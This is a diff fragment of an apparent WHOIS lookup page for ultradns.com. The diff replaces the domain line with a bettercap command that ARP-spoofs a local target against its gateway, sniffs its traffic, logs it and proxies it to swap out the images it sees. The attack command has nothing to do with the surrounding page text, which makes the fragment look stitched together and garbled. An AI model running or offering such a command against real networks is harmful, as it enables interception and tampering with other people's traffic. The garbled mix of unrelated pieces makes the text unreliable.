@@ -13,7 +13,11 @@ SECURITY
 WHOIS
 SUPPORT
 0
-ultradns.com
+bettercap -I wlan2 -O bettercap_proxy.log -S ARP -X \
+    --proxy --proxy-module replace_images \
+    --httpd --httpd-path img \
+    --gateway 192.168.0.1 --target 192.168.0.7
+
 Updated 1 second ago
 Domain Information
 Domain:ultradns.com
